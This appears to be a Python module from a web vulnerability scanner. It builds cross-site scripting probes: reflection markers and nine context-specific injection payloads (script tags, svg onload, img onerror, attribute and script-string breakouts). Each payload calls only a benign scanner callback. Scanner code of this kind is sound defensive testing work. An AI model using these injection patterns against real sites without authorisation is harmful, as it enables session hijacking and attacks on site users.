"""
XSS payloads.

Detection uses a reflection marker: a unique token wrapped in raw HTML special
chars. If it comes back un-escaped (the angle brackets survive), the parameter
reflects into HTML without encoding — a candidate.

Verification uses execution payloads that call a JS binding we expose on the page
(window.__psxss). If the binding fires with our token, the injection actually ran
in the browser — confirmed. Payloads are harmless: they only call our callback,
never alert()/navigation/network, and cover the common HTML-body, attribute-
breakout, and script-string contexts.
"""

XSS_MARKER_PREFIX = "psx"
EXEC_BINDING = "__psxss"


def xss_marker_payload(token: str) -> str:
    """Reflection probe: unique token + raw special chars."""
    return f'{XSS_MARKER_PREFIX}{token}<svg/onload=1>"\''


def xss_marker_signal(token: str) -> str:
    """The un-escaped substring we look for in the response body."""
    return f"{XSS_MARKER_PREFIX}{token}<svg/onload=1>"


# Stored XSS uses its own prefix so a stored marker is never confused with a
# reflected one, and so we can map a sink hit back to the injection that seeded it.
STORED_MARKER_PREFIX = "pstx"


def stored_marker_payload(token: str) -> str:
    """Stored-XSS reflection probe: a distinct token + raw special chars."""
    return f'{STORED_MARKER_PREFIX}{token}<svg/onload=1>"\''


def stored_marker_signal(token: str) -> str:
    """The un-escaped substring that, if found on a DIFFERENT page, means it was stored."""
    return f"{STORED_MARKER_PREFIX}{token}<svg/onload=1>"


def xss_exec_payloads(token: str) -> list[str]:
    """Execution probes for the browser verifier, across common contexts."""
    cb = f"window.{EXEC_BINDING}"
    return [
        f'<script>{cb}("{token}")</script>',               # HTML body — runs on parse (no network, most reliable)
        f'<svg onload={cb}("{token}")>',                   # HTML body — runs on parse
        f'<img src=x onerror={cb}("{token}")>',            # HTML body — runs after the image fails to load
        f'"><script>{cb}("{token}")</script>',             # break out of a double-quoted attribute
        f"'><script>{cb}(\"{token}\")</script>",           # break out of a single-quoted attribute
        f'"><img src=x onerror={cb}("{token}")>',          # attribute breakout (network)
        f'</script><script>{cb}("{token}")</script>',      # break out of a <script> block
        f'";{cb}("{token}");//',                           # inside a double-quoted JS string
        f"';{cb}(\"{token}\");//",                         # inside a single-quoted JS string
    ]
